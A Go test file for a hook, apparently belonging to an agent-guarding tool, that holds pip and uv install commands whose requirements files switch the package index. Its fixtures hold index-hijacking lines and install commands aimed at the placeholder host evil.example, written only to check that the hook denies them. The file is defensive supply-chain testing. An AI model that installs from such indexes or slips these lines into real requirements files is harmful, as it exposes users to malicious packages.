package main

import (
	"bytes"
	"context"
	"encoding/json"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"testing"
	"time"
)

// READER-REQFILE-1 (ADR-0159 round 12): the hook reads the requirements files a line names, on the machine, and holds
// the line when one moves where packages come from. Placeholders zz-req-pkg and evil.example only; every file is in
// the test's own temporary folder.

func writeFiles(t *testing.T, dir string, files map[string]string) {
	t.Helper()
	for name, body := range files {
		p := filepath.Join(dir, filepath.FromSlash(name))
		if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(p, []byte(body), 0o644); err != nil {
			t.Fatal(err)
		}
	}
}

// codexDecision: Codex's answer as decision and reason ("" and "" for silence).
func codexDecision(t *testing.T, out string) (string, string) {
	t.Helper()
	if out == "" {
		return "", ""
	}
	var got struct {
		H map[string]string `json:"hookSpecificOutput"`
	}
	if err := json.Unmarshal([]byte(out), &got); err != nil {
		t.Fatalf("not JSON: %q", out)
	}
	return got.H["permissionDecision"], got.H["permissionDecisionReason"]
}

const evilIndex = "--index-url https://evil.example/simple\n"

func TestReqFileHookHolds(t *testing.T) {
	for _, c := range []struct {
		name, command string
		files         map[string]string
	}{
		{"an index in the file", "pip install -r requirements.txt", map[string]string{"requirements.txt": "zz-req-pkg\n" + evilIndex}},
		{"an extra index", "uv pip install -r req.txt", map[string]string{"req.txt": "--extra-index-url https://evil.example/simple\n"}},
		{"find-links", "pip3.12 install -r req.txt", map[string]string{"req.txt": "-f ./wheels\nzz-req-pkg\n"}},
		{"a constraints file", "pip install -r r.txt -c c.txt", map[string]string{"r.txt": "zz-req-pkg\n", "c.txt": evilIndex}},
		{"nested, from the naming file's folder", "pip install -r requirements.txt",
			map[string]string{"requirements.txt": "-r reqs/base.txt\n", "reqs/base.txt": "-c ../c.txt\n", "c.txt": evilIndex}},
		{"after a cd", "cd api && pip install -r requirements.txt", map[string]string{"api/requirements.txt": evilIndex}},
		{"a cd in a subshell", "(cd api) && pip install -r requirements.txt",
			map[string]string{"api/requirements.txt": "zz-req-pkg\n", "requirements.txt": evilIndex}},
		{"through python -m pip", "python3 -m pip install -r r.txt", map[string]string{"r.txt": evilIndex}},
		{"uv pip sync", "uv pip sync r.txt", map[string]string{"r.txt": evilIndex}},
		{"an absolute path", "", map[string]string{"abs.txt": evilIndex}},
		{"at a URL", "pip install -r https://evil.example/r.txt", nil},
		{"by a variable", `pip install -r "$REQ"`, nil},
		{"too large", "pip install -r big.txt", map[string]string{"big.txt": strings.Repeat("#", maxReqFile+1)}},
	} {
		dir := t.TempDir()
		writeFiles(t, dir, c.files)
		cmd := c.command
		if cmd == "" {
			cmd = "pip install -r " + filepath.Join(dir, "abs.txt")
		}
		f := &fakeHook{}
		srv := f.server(t)
		d, reason := codexDecision(t, runCodex(t, srv.URL, codexInputIn(dir, cmd)))
		if d != "deny" || !strings.Contains(reason, "requirements file") || !strings.Contains(reason, "confirm with the user") {
			t.Errorf("%s: %s %q", c.name, d, reason)
		}
		if len(f.calls()) != 0 {
			t.Errorf("%s: a line with nothing named was sent: %v", c.name, f.calls())
		}
	}
}

func TestReqFileHookSilent(t *testing.T) {
	for _, c := range []struct {
		name, cwd, command string
		files              map[string]string
	}{
		{"an honest file", "", "pip install -r requirements.txt",
			map[string]string{"requirements.txt": "zz-req-pkg==1.0 --hash=sha256:00\n-e .\n--index-url https://pypi.org/simple\n# -i https://evil.example\n"}},
		{"no such file", "", "pip install -r missing.txt", nil},
		{"no folder from the runtime", "-", "pip install -r requirements.txt", nil},
		{"a requirement line's own options", "", "pip install -r r.txt", map[string]string{"r.txt": "zz-req-pkg " + evilIndex}},
		{"no requirements file", "", "pip install -U pip", nil},
		{"after a cd, the other folder's", "", "cd api && pip install -r r.txt", map[string]string{"api/r.txt": "zz-req-pkg\n"}},
	} {
		dir := t.TempDir()
		writeFiles(t, dir, c.files)
		cwd := dir
		if c.cwd == "-" {
			cwd = ""
		}
		f := &fakeHook{}
		srv := f.server(t)
		if d, reason := codexDecision(t, runCodex(t, srv.URL, codexInputIn(cwd, c.command))); d != "" {
			t.Errorf("%s: %s %q", c.name, d, reason)
		}
	}
}

// With packages named the server is asked as before; the file's hold stands over its allow, joins its hold, and gives
// way to its block. An unreachable server does not let the file's hold go.
func TestReqFileHookWithTheServer(t *testing.T) {
	dir := t.TempDir()
	writeFiles(t, dir, map[string]string{"r.txt": evilIndex, "ok.txt": "zz-req-pkg\n"})
	for _, c := range []struct {
		name, file, server, want, reason string
	}{
		{"allow", "r.txt", "", "deny", "requirements file"},
		{"hold", "r.txt", `{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"ask","permissionDecisionReason":"alalanet install_check: HOLD — new_package"}}`, "deny", "new_package"},
		{"block", "r.txt", `{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"deny","permissionDecisionReason":"alalanet install_check: BLOCK — known_malicious"}}`, "deny", "BLOCK"},
		{"allow, an honest file", "ok.txt", "", "", ""},
	} {
		f := &fakeHook{answer: func(w http.ResponseWriter) { _, _ = w.Write([]byte(c.server)) }}
		srv := f.server(t)
		d, reason := codexDecision(t, runCodex(t, srv.URL, codexInputIn(dir, "pip install -r "+c.file+" zz-req-pkg")))
		if d != c.want || !strings.Contains(reason, c.reason) || len(f.calls()) != 1 {
			t.Errorf("%s: %s %q, %d calls", c.name, d, reason, len(f.calls()))
		}
		if c.name == "hold" && !strings.Contains(reason, "requirements file") {
			t.Errorf("hold: the file's reason was not added: %q", reason)
		}
		if c.name == "block" && strings.Contains(reason, "requirements file") {
			t.Errorf("block: %q", reason)
		}
	}
	if d, reason := codexDecision(t, runCodex(t, "http://127.0.0.1:1", codexInputIn(dir, "pip install -r r.txt zz-req-pkg"))); d != "deny" ||
		!strings.Contains(reason, "requirements file") {
		t.Errorf("unreachable: %s %q", d, reason)
	}
}

// ${NAME} in a file is expanded from the hook's environment, as pip expands it from its own.
func TestReqFileHookEnvironment(t *testing.T) {
	dir := t.TempDir()
	writeFiles(t, dir, map[string]string{"r.txt": "--index-url ${ZZ_IDX}\n"})
	run := func(getenv func(string) string) string {
		var out bytes.Buffer
		err := runHookContext(context.Background(), "codex", strings.NewReader(codexInputIn(dir, "pip install -r r.txt")), &out,
			hookCall{client: &http.Client{Timeout: 2 * time.Second}, api: "http://127.0.0.1:1", getenv: getenv})
		if err != nil {
			t.Fatal(err)
		}
		d, _ := codexDecision(t, out.String())
		return d
	}
	if d := run(func(k string) string { return map[string]string{"ZZ_IDX": "https://pypi.org/simple"}[k] }); d != "" {
		t.Errorf("the public index through the environment: %s", d)
	}
	if d := run(func(k string) string { return map[string]string{"ZZ_IDX": "https://evil.example/simple"}[k] }); d != "deny" {
		t.Errorf("another index through the environment: %q", d)
	}
	if d := run(nil); d != "deny" {
		t.Errorf("an unset variable: %q", d)
	}
}

func TestReqFileHoldBounds(t *testing.T) {
	dir := t.TempDir()
	files := map[string]string{}
	for i := 0; i <= maxReqFiles; i++ {
		files["r/f"+strconv.Itoa(i)+".txt"] = ""
	}
	var chain strings.Builder
	for name := range files {
		chain.WriteString("-r " + filepath.Base(name) + "\n")
	}
	files["r/top.txt"] = chain.String()
	writeFiles(t, dir, files)
	if why := reqFileHold(dir, "", "pip install -r r/top.txt", nil); !strings.Contains(why, "more requirements files") {
		t.Errorf("past the bound: %q", why)
	}
	// past the bytes one line may read (maxReqBytes, made small here), the line holds
	oldMax := maxReqBytes
	maxReqBytes = 10
	writeFiles(t, dir, map[string]string{"big1.txt": "zz-a==1.0\n", "big2.txt": "zz-b==1.0\n"})
	if why := reqFileHold(dir, "", "pip install -r big1.txt -r big2.txt", nil); !strings.Contains(why, "larger in all") {
		t.Errorf("past the bytes: %q", why)
	}
	maxReqBytes = oldMax
	// a file that names itself is read once
	writeFiles(t, dir, map[string]string{"loop.txt": "-r loop.txt\nzz-req-pkg\n"})
	if why := reqFileHold(dir, "", "pip install -r loop.txt", nil); why != "" {
		t.Errorf("a loop: %q", why)
	}
	// a folder where a file should be cannot be read
	if err := os.MkdirAll(filepath.Join(dir, "adir.txt"), 0o755); err != nil {
		t.Fatal(err)
	}
	if why := reqFileHold(dir, "", "pip install -r adir.txt", nil); !strings.Contains(why, "could not be read") {
		t.Errorf("a folder: %q", why)
	}
	// a cwd the runtime gives that is not absolute places nothing, even where it names a folder from here
	writeFiles(t, dir, map[string]string{"rel/r.txt": evilIndex})
	t.Chdir(dir)
	if why := reqFileHold("rel", "", "pip install -r r.txt", nil); why != "" {
		t.Errorf("a relative cwd: %q", why)
	}
	if got := clip(strings.Repeat("a", 200)); len(got) != 120 || !strings.HasSuffix(got, "...") {
		t.Errorf("clip: %d", len(got))
	}
}

// Round 13: what the hook prints never carries a value from the environment or from the line's own assignments (P2-1,
// P3-1); the line's assignment and export win over the hook's environment; reading past the deadline holds (P3-2).
func TestReqFileRound13(t *testing.T) {
	secret := "zz" + "Key" + "_" + strings.Repeat("R", 10) + "9e1d"
	dir := t.TempDir()
	writeFiles(t, dir, map[string]string{"r.txt": "--index-url ${ZZ_S}\n", "s.txt": "-r ${ZZ_S}.txt\n", "t.txt": "--index-url ${ZZ_IDX}\n",
		secret + ".txt": evilIndex}) // the file s.txt names through the variable: read, and quoted by the variable's name
	hookEnv := func(k string) string {
		return map[string]string{"ZZ_S": secret, "ZZ_IDX": "https://pypi.org/simple"}[k]
	}
	for _, line := range []string{"pip install -r r.txt", "pip install -r s.txt", "ZZ_S=" + secret + " pip install -r r.txt",
		"export ZZ_S=" + secret + " && pip install -r r.txt", "ZZ_IDX=" + secret + " pip install -r t.txt"} {
		why := reqFileHold(dir, "", line, hookEnv)
		if why == "" || strings.Contains(why, secret[2:12]) {
			t.Errorf("%q: %q", line, why)
		}
	}
	// the line's value is pip's: an export before the command, an assignment on it; the hook's alone otherwise
	for line, hold := range map[string]bool{
		"pip install -r t.txt": false,
		"export ZZ_IDX=https://evil.example/simple && pip install -r t.txt":                                true,
		"ZZ_IDX=https://evil.example/simple pip install -r t.txt":                                          true,
		"ZZ_IDX=https://evil.example/simple true && pip install -r t.txt":                                  false, // the assignment is true's
		"export ZZ_IDX=https://evil.example/simple && ZZ_IDX=https://pypi.org/simple pip install -r t.txt": false,
	} {
		if why := reqFileHold(dir, "", line, hookEnv); (why != "") != hold {
			t.Errorf("%q: %q, want a hold %v", line, why, hold)
		}
	}
	// folders: ~ from home, uv's --directory (= and from any place, not after a runner's command), UV_WORKING_DIR,
	// env and sudo; one this reading cannot place holds
	home := t.TempDir()
	writeFiles(t, home, map[string]string{"h.txt": evilIndex, "p/r.txt": evilIndex})
	// a clean folder: its r.txt is honest, sub's and sub/deeper's name another index
	clean := t.TempDir()
	writeFiles(t, clean, map[string]string{"r.txt": "zz-req-pkg\n", "sub/r.txt": evilIndex, "sub/deeper/r.txt": evilIndex, "ok.txt": "zz-req-pkg\n"})
	for line, hold := range map[string]bool{
		"pip install -r r.txt":                                      false, // control
		"uv pip install -r r.txt":                                   false,
		"/usr/bin/env -C sub pip install -r r.txt":                  true,
		"env --chdir sub pip install -r r.txt":                      true,
		"sudo --chdir sub pip install -r r.txt":                     true,
		"env --unset=ZZ_X -C sub pip install -r r.txt":              true,
		"pip install -r ~/h.txt":                                    true,
		"cd ~ && pip install -r h.txt":                              true,
		"cd ~/p && pip install -r r.txt":                            true,
		"pip install -r ~zz-user/h.txt":                             true, // ~user: not placed, held
		"uv --directory=sub pip install -r r.txt":                   true,
		"uv pip install -r r.txt --directory sub":                   true,
		"uvx --directory sub --with-requirements r.txt zz-req-pkg":  true,
		"uvx --with-requirements ok.txt zz-req-pkg --directory sub": false, // zz-req-pkg's own word
		"uv --project sub pip install -r ok.txt":                    false, // --project moves no -r (uv 0.13.7)
		"export UV_WORKING_DIR=sub && uv pip install -r r.txt":      true,
		"UV_WORKING_DIR=sub uv add -r r.txt":                        true,
		"UV_WORKING_DIR=sub pip install -r ok.txt":                  false, // pip does not read it
		"env -C sub uv --directory deeper pip install -r r.txt":     true,
		"env -iC sub pip install -r r.txt":                          true,
		"env -u ZZ_X -C sub pip install -r r.txt":                   true,
		"env --ch sub pip install -r r.txt":                         true,
		"sudo -D sub pip install -r r.txt":                          true,
		"sudo --chdir=sub pip install -r r.txt":                     true,
		"sudo -u zz -Dsub pip install -r r.txt":                     true,
		"sudo -R / pip install -r ok.txt":                           true,
		"sudo --chroot=/ pip install -r ok.txt":                     true,
		"env -C $ZZ_D pip install -r ok.txt":                        true,
		"uv --directory ~zz-user pip install -r ok.txt":             true,
		"env -u ZZ_C pip install -r ok.txt":                         false,
		"env -S 'pip install -r ok.txt'":                            false,
	} {
		if why := reqFileHold(clean, home, line, nil); (why != "") != hold {
			t.Errorf("%q: %q, want a hold %v", line, why, hold)
		}
	}
	dir2 := t.TempDir()
	writeFiles(t, dir2, map[string]string{"q.txt": "zz-req-pkg\n", "sub/q.txt": evilIndex})
	for line, hold := range map[string]bool{"UV_WORKING_DIR=sub pip install -r q.txt": false, "UV_WORKING_DIR=sub uv pip install -r q.txt": true,
		"uv --directory /zz-no-such-folder pip install -r q.txt": false} {
		if why := reqFileHold(dir2, home, line, nil); (why != "") != hold {
			t.Errorf("%q: %q, want a hold %v", line, why, hold)
		}
	}
	if why := reqFileHold("", home, "uv --directory "+filepath.Join(dir2, "sub")+" pip install -r q.txt", nil); why == "" {
		t.Error("an absolute --directory with no cwd: not read")
	}
	// the hook gives the reader its home
	var out bytes.Buffer
	if err := runHookContext(context.Background(), "codex", strings.NewReader(codexInputIn(dir, "pip install -r ~/h.txt")), &out,
		hookCall{client: &http.Client{Timeout: 2 * time.Second}, api: "http://127.0.0.1:1", home: home}); err != nil {
		t.Fatal(err)
	}
	if d, reason := codexDecision(t, out.String()); d != "deny" || !strings.Contains(reason, "custom registry") {
		t.Errorf("~ through the hook: %s %q", d, reason)
	}
	if why := reqFileHold(dir, "", "pip install -r ~/h.txt", nil); !strings.Contains(why, "cannot place") {
		t.Errorf("~ with no home: %q", why)
	}
	if UVD := "UV_WORKING_DIR"; reqFileHold(clean, home, "uv pip install -r r.txt", func(k string) string {
		return map[string]string{UVD: "sub"}[k]
	}) == "" {
		t.Error("the hook's own UV_WORKING_DIR")
	}
	// a stalled read: the hook holds at its deadline (the policy files' one), it does not wait or let the line go
	old := policyDeadline
	policyDeadline = 50 * time.Millisecond
	stall := make(chan struct{})
	writeFiles(t, dir, map[string]string{"ok.txt": "zz-req-pkg\n"})
	stalled := filepath.Join(dir, "ok.txt")
	wait := func(p string) {
		if p == stalled {
			<-stall
		}
	}
	beforeOpen.Store(&wait)
	t.Cleanup(func() { policyDeadline = old; beforeOpen.Store(nil); close(stall) })
	f := &fakeHook{}
	srv := f.server(t)
	d, reason := codexDecision(t, runCodex(t, srv.URL, codexInputIn(dir, "pip install -r ok.txt")))
	if d != "deny" || !strings.Contains(reason, "not read in time") {
		t.Errorf("stalled: %s %q", d, reason)
	}
}

// The hook on real `pip freeze` output in UTF-16LE with its mark (P2-3): silent, as pip reads it; with an index line
// added, held.
func TestReqFilePipFreezeUTF16(t *testing.T) {
	b, err := os.ReadFile(filepath.Join("..", "..", "internal", "installread", "testdata", "pip_freeze_utf16le.txt"))
	if err != nil {
		t.Fatal(err)
	}
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "requirements.txt"), b, 0o644); err != nil {
		t.Fatal(err)
	}
	if why := reqFileHold(dir, "", "pip install -r requirements.txt", nil); why != "" {
		t.Errorf("honest: %q", why)
	}
	for _, c := range "-f ./wheels\r\n" {
		b = append(b, byte(c), 0)
	}
	if err := os.WriteFile(filepath.Join(dir, "evil.txt"), b, 0o644); err != nil {
		t.Fatal(err)
	}
	if why := reqFileHold(dir, "", "pip install -r evil.txt", nil); !strings.Contains(why, "custom registry") {
		t.Errorf("with find-links: %q", why)
	}
}

// Round 14: a cd this reading cannot place holds a later relative file (P2-B); a bare cd is home; a placed folder
// places again; pip's descriptors and logins in another user's home hold (P3-B); the too-large wording (P3-D).
func TestReqFileRound14(t *testing.T) {
	home, cwd := t.TempDir(), t.TempDir()
	writeFiles(t, home, map[string]string{"r.txt": evilIndex})
	writeFiles(t, cwd, map[string]string{"r.txt": "zz-req-pkg\n", "sub/r.txt": evilIndex, "ok/r.txt": "zz-req-pkg\n",
		"n.txt": "-r /dev/fd/3\n"})
	abs := filepath.Join(cwd, "ok")
	for line, want := range map[string]string{
		"pip install -r r.txt":                                     "",
		"cd && pip install -r r.txt":                               "custom registry",
		"cd ~ && pip install -r r.txt":                             "custom registry",
		"cd -P sub && pip install -r r.txt":                        "does not place",        // round 15: an allowlist
		"cd -- sub && pip install -r r.txt":                        "does not place",        // round 15: an allowlist
		"cd $D && pip install -r r.txt":                            "does not place (cd $D", // round 15: an allowlist
		"cd `pwd`/sub && pip install -r r.txt":                     "does not place",        // round 15: an allowlist
		"cd $D && cd " + abs + " && pip install -r r.txt":          "does not place",        // round 15: an allowlist
		"cd sub && cd $D && cd - && pip install -r r.txt":          "does not place",        // round 15: an allowlist
		"cd $D && pip install -r " + filepath.Join(cwd, "r.txt"):   "does not place",        // round 15: an allowlist
		"cd - && pip install -r r.txt":                             "does not place",        // round 15: an allowlist
		"pushd sub && pip install -r r.txt":                        "does not place",        // round 15: an allowlist
		"pushd sub && popd && pip install -r r.txt":                "does not place",        // round 15: an allowlist
		"cd $(pwd)/sub && pip install -r r.txt":                    "does not place",        // round 15: an allowlist
		"cd sub && echo $(date) && pip install -r r.txt":           "does not place",        // round 15: an allowlist
		"popd && pip install -r r.txt":                             "does not place",        // round 15: an allowlist
		"pushd && pip install -r r.txt":                            "does not place",        // round 15: an allowlist
		"cd $D && uv --directory " + abs + " pip install -r r.txt": "does not place",        // round 15: an allowlist
		"pip install -r /dev/stdin < r.txt":                        "file descriptors",
		"pip install -r /proc/1234/fd/3":                           "file descriptors",
		"pip install -r n.txt":                                     "file descriptors",
		"su - -c 'pip install -r r.txt'":                           "login folder",
		"su -l zz -c 'pip install -r r.txt'":                       "login folder",
		"su --login -c 'pip install -r r.txt'":                     "login folder",
		"su -lc 'pip install -r r.txt'":                            "login folder",
		"runuser -l zz -c 'pip install -r r.txt'":                  "login folder",
		"su -c 'pip install -r r.txt'":                             "",
		"su -m -c 'pip install -r r.txt'":                          "",
		"sudo -iu zz pip install -r r.txt":                         "login folder (sudo -i)",
		"sudo -u zz -i pip install -r r.txt":                       "login folder (sudo -i)",
		"sudo --lo pip install -r r.txt":                           "login folder (sudo --login)",
		"sudo -u zz pip install -r r.txt":                          "",
	} {
		why := reqFileHold(cwd, home, line, nil)
		if want == "" && why != "" || want != "" && !strings.Contains(why, want) {
			t.Errorf("%q: %q, want %q", line, why, want)
		}
	}
	// a folder named like an option after "--"; UV_WORKING_DIR that cannot be placed is named, never quoted (P3-A)
	writeFiles(t, cwd, map[string]string{"-x/r.txt": evilIndex})
	if why := reqFileHold(cwd, "", "cd -x && pip install -r r.txt", nil); !strings.Contains(why, "does not place") {
		t.Errorf("cd -- -x: %q", why)
	}
	user := "zz" + "usr" + strings.Repeat("K", 6)
	for _, line := range []string{"UV_WORKING_DIR=~" + user + " uv pip install -r r.txt", "export UV_WORKING_DIR=~" + user + " && uv pip install -r r.txt"} {
		if why := reqFileHold(cwd, home, line, nil); !strings.Contains(why, "(UV_WORKING_DIR)") || strings.Contains(why, user) {
			t.Errorf("%q: %q", line, why)
		}
	}
	if why := reqFileHold(cwd, "", "cd && pip install -r r.txt", nil); !strings.Contains(why, "does not place (cd:") {
		t.Errorf("a bare cd with no home: %q", why)
	}
	big := t.TempDir()
	writeFiles(t, big, map[string]string{"big.txt": strings.Repeat("#", maxReqFile+1)})
	if why := reqFileHold(big, "", "pip install -r big.txt", nil); !strings.Contains(why, "larger than alalanet-agent reads in a requirements file") ||
		strings.Contains(why, "policy") {
		t.Errorf("too large: %q", why)
	}
	for w, want := range map[string]bool{"-": true, "-l": true, "--login": true, "--lo": true, "--l": false, "-lc": true, "-mlc": true,
		"-c": false, "-m": false, "-cl": false, "--": false} {
		if loginSwitch([]string{w, "x"}) != want {
			t.Errorf("loginSwitch(%q) != %v", w, want)
		}
	}
	// getopt reads -l after -c's script too; -c's value is no option; "--" ends them
	for ws, want := range map[string]bool{"-c -l -l": true, "-c - x": false, "-c x -": true, "-- -l": false, "-s -l x": false, "-u -l -l": true} {
		if loginSwitch(strings.Fields(ws)) != want {
			t.Errorf("loginSwitch(%q) != %v", ws, want)
		}
	}
	// a nested file of an absolute file named after an unplaced cd is read from that file's folder
	writeFiles(t, cwd, map[string]string{"ok/top.txt": "-r n2.txt\n", "ok/n2.txt": "zz-req-pkg\n"})
	if why := reqFileHold(cwd, home, "cd ok && pip install -r top.txt", nil); why != "" {
		t.Errorf("nested from the naming file's folder: %q", why)
	}
}

// Round 15: the reader is an allowlist. Placed: a bare cd, cd with one literal path while no CDPATH is set, env -C,
// sudo -D, uv's --directory. Every other change of folder holds; so does a glob; up to 16 changes are followed.
func TestReqFileRound15(t *testing.T) {
	home, cwd := t.TempDir(), t.TempDir()
	writeFiles(t, home, map[string]string{"r.txt": "zz-req-pkg\n", "p/r.txt": evilIndex})
	writeFiles(t, cwd, map[string]string{"r.txt": "zz-req-pkg\n", "sub/r.txt": evilIndex, "a/b/r.txt": evilIndex})
	deep := strings.Repeat("cd a; cd ..; ", 8) // 16 changes
	for line, want := range map[string]string{
		"cd sub && pip install -r r.txt":                          "custom registry",
		"cd ./sub && pip install -r r.txt":                        "custom registry",
		"cd a/b && pip install -r r.txt":                          "custom registry",
		"cd && pip install -r r.txt":                              "",
		"cd ~ && pip install -r r.txt":                            "",
		"cd ~/p && pip install -r r.txt":                          "custom registry",
		"{ cd sub; } && pip install -r r.txt":                     "custom registry",
		"chdir sub && pip install -r r.txt":                       "custom registry",
		"cd ~zz && pip install -r r.txt":                          "does not place",
		"cd s* && pip install -r r.txt":                           "does not place",
		"cd sub extra && pip install -r r.txt":                    "does not place",
		"cd -L sub && pip install -r r.txt":                       "does not place",
		"CDPATH= cd sub && pip install -r r.txt":                  "does not place",
		"declare -x CDPATH=x; cd sub && pip install -r r.txt":     "does not place",
		"typeset CDPATH; cd sub && pip install -r r.txt":          "does not place",
		"CDPATH=x pip install -r r.txt":                           "", // no cd: CDPATH changes nothing
		"pip install -r r.txt --config-settings 'x(y)' && cd sub": "", // a quoted paren is no subshell; the cd comes after
		"pip install -r r.txt && (cd sub)":                        "does not place",
		"pip install -r 'r*.txt'":                                 "pattern",
		"pip install -r r?.txt":                                   "pattern",
		"env -C 's*' pip install -r r.txt":                        "cannot place",
		deep + "pip install -r r.txt":                             "",
		deep + "cd a; pip install -r r.txt":                       "more folder changes",
	} {
		why := reqFileHold(cwd, home, line, nil)
		if want == "" && why != "" || want != "" && !strings.Contains(why, want) {
			t.Errorf("%q: %q, want %q", line, why, want)
		}
	}
	if why := reqFileHold(cwd, home, "cd sub && pip install -r r.txt", func(k string) string {
		return map[string]string{"CDPATH": "/zz"}[k]
	}); !strings.Contains(why, "CDPATH") {
		t.Errorf("the hook's CDPATH: %q", why)
	}
	// a bare cd ignores CDPATH (bash); with no folder to start from a relative cd is not placed
	writeFiles(t, home, map[string]string{"h.txt": evilIndex})
	if why := reqFileHold(cwd, home, "CDPATH=x; cd && pip install -r h.txt", nil); !strings.Contains(why, "an assignment of CDPATH") {
		t.Errorf("a bare cd with CDPATH on the line (round 16: the assignment is no command cdSafe knows): %q", why)
	}
	if why := reqFileHold(cwd, home, "cd && pip install -r h.txt", func(k string) string { return map[string]string{"CDPATH": "x"}[k] }); !strings.Contains(why, "custom registry") {
		t.Errorf("a bare cd with the hook's CDPATH (bash ignores it): %q", why)
	}
	if why := reqFileHold("", home, "cd sub && pip install -r r.txt", nil); !strings.Contains(why, "no folder to start from") {
		t.Errorf("no cwd: %q", why)
	}
	for line, want := range map[string]bool{"a (b)": true, "a '(b)'": false, `a "(b)"`: false, `a \(b`: false, "a $(b)": true,
		`a '\'(`: true, `"a\"(b"`: false} {
		if unquotedParen(line) != want {
			t.Errorf("unquotedParen(%q) != %v", line, want)
		}
	}
}

// Round 16: a literal cd is placed only on a line whose every other command is one cdSafe knows; a path is joined as
// the kernel resolves it (a link's "..", not filepath.Clean's).
func TestReqFileRound16(t *testing.T) {
	home, cwd := t.TempDir(), t.TempDir()
	writeFiles(t, cwd, map[string]string{"r.txt": "zz-req-pkg\n", "sub/r.txt": evilIndex, "phys/r.txt": evilIndex,
		"phys/sub/r.txt": "zz-req-pkg\n"})
	if err := os.Symlink(filepath.Join(cwd, "phys", "sub"), filepath.Join(cwd, "link")); err != nil {
		t.Fatal(err)
	}
	for line, want := range map[string]string{
		"cd sub && pip install -r r.txt":                                               "custom registry",
		"cd sub && echo hi && ls && mkdir -p x && pwd && true && pip install -r r.txt": "custom registry",
		"cd sub && test -f r.txt && [ -d . ] && pip install -r r.txt":                  "custom registry",
		"export X=1 Y=2 && cd sub && python3 -m pip install -r r.txt":                  "custom registry",
		"X=1 cd sub && sudo -E env Y=2 pip install -r r.txt":                           "custom registry",
		"cd sub && uv pip install -r r.txt && python3.12 -m pip install -r r.txt":      "custom registry",
		"source .venv/bin/activate && cd sub && pip install -r r.txt":                  "the line also runs source",
		"cd sub && npm i && pip install -r r.txt":                                      "the line also runs npm",
		"setopt CHASE_LINKS; cd link && cd .. && pip install -r r.txt":                 "the line also runs setopt",
		"builtin cd sub && pip install -r r.txt":                                       "custom registry",                       // the walk reads builtin as a wrapper: the cd is the builtin
		"cd() { :; }; cd sub && pip install -r r.txt":                                  "defines an alias or a function (cd())", // round 19
		"export -f cd && cd sub && pip install -r r.txt":                               "export -f cd",
		"export CdPath=x && cd sub && pip install -r r.txt":                            "export CdPath=x",
		"Cdpath+=x cd sub && pip install -r r.txt":                                     "an assignment of CDPATH",
		"python3x -m pip install -r r.txt; cd sub":                                     "the line also runs python3x",
		"set -P && pip install -r r.txt":                                               "",                // no cd: nothing to place
		"pip install -r link/../r.txt":                                                 "custom registry", // the kernel's "..": phys/r.txt
		"env -C link/.. pip install -r r.txt":                                          "custom registry",
		"cd link && pip install -r ../r.txt":                                           "custom registry", // pip opens ../r.txt from phys/sub
		"cd link && cd .. && pip install -r r.txt":                                     "",                // bash's logical cd ..: cwd
	} {
		why := reqFileHold(cwd, home, line, nil)
		if want == "" && why != "" || want != "" && !strings.Contains(why, want) {
			t.Errorf("%q: %q, want %q", line, why, want)
		}
	}
	// absolute names and folders joined raw too; a standalone assignment is no command
	if err := os.Symlink(filepath.Join(cwd, "phys", "sub"), filepath.Join(home, "hl")); err != nil {
		t.Fatal(err)
	}
	for line, want := range map[string]string{
		"pip install -r " + cwd + "/link/../r.txt":        "custom registry",
		"env -C " + cwd + "/link/.. pip install -r r.txt": "custom registry",
		"D=1; cd sub && pip install -r r.txt":             "custom registry",
		"pip install -r ~/hl/../r.txt":                    "custom registry", // the shell's ~ expansion, then the kernel's ".."
	} {
		if why := reqFileHold(cwd, home, line, nil); !strings.Contains(why, want) {
			t.Errorf("%q: %q, want %q", line, why, want)
		}
	}
	// ~/ joined raw as well, and a nested file from its naming file's raw folder
	writeFiles(t, home, map[string]string{"top.txt": "-r ../n.txt\n", "n.txt": "zz-req-pkg\n", "r.txt": "zz-req-pkg\n"})
	writeFiles(t, cwd, map[string]string{"phys/n.txt": evilIndex, "phys/sub/top.txt": "-r ../n.txt\n"})
	if why := reqFileHold(cwd, home, "pip install -r ~/hl/top.txt", nil); !strings.Contains(why, "custom registry") {
		t.Errorf("nested ../ from a link's folder: %q", why)
	}
	for in, want := range map[[2]string]string{{"/a", "b"}: "/a/b", {"/a/", "b"}: "/a/b", {"/a/l", "../b"}: "/a/l/../b"} {
		if got := rawJoin(in[0], in[1]); got != want {
			t.Errorf("rawJoin%v = %q", in, got)
		}
	}
	for in, want := range map[string]string{"/a/l/../b.txt": "/a/l/..", "/b.txt": "/", "b.txt": "/"} {
		if got := rawDir(in); got != want {
			t.Errorf("rawDir(%q) = %q", in, got)
		}
	}
}

// Round 17: on a line with a literal cd to place, a $ outside single quotes anywhere in the raw line holds; a $ or an
// assignment of HOME unplaces ~ and a bare cd; PWD and OLDPWD are what cd resolves through.
func TestReqFileRound17(t *testing.T) {
	home, cwd := t.TempDir(), t.TempDir()
	writeFiles(t, home, map[string]string{"r.txt": evilIndex})
	writeFiles(t, cwd, map[string]string{"r.txt": "zz-req-pkg\n", "sub/r.txt": evilIndex})
	for line, want := range map[string]string{
		"cd sub && echo '$X ${CDPATH:=e}' && pip install -r r.txt": "custom registry", // single quotes: no expansion
		`cd sub && echo \$X && pip install -r r.txt`:               "custom registry", // escaped
		`cd sub && echo "a\$b" && pip install -r r.txt`:            "custom registry",
		`cd sub && echo "$X" && pip install -r r.txt`:              "a $ on the line",
		"cd sub && pip install -r r.txt --cache-dir $D":            "a $ on the line",
		"cd sub && true <<EOF\n$X\nEOF\npip install -r r.txt":      "does not place", // the walk reads the body as commands
		"pip install -r r.txt $X":                                  "",               // no cd, no ~: the $ changes nothing placed
		"pip install -r ~/r.txt":                                   "custom registry",
		"echo $X && pip install -r ~/r.txt":                        "cannot place",
		"HOME=/zz pip install -r ~/r.txt":                          "cannot place",
		"HOME+=/zz pip install -r ~/r.txt":                         "cannot place",
		"read HOME; pip install -r ~/r.txt":                        "cannot place",
		"export HOME=/zz && cd && pip install -r r.txt":            "does not place",
		"PWD=/zz cd sub && pip install -r r.txt":                   "the line also runs an assignment of CDPATH",
		"OLDPWD=/zz; cd sub && pip install -r r.txt":               "the line also runs an assignment of CDPATH",
	} {
		why := reqFileHold(cwd, home, line, nil)
		if want == "" && why != "" || want != "" && !strings.Contains(why, want) {
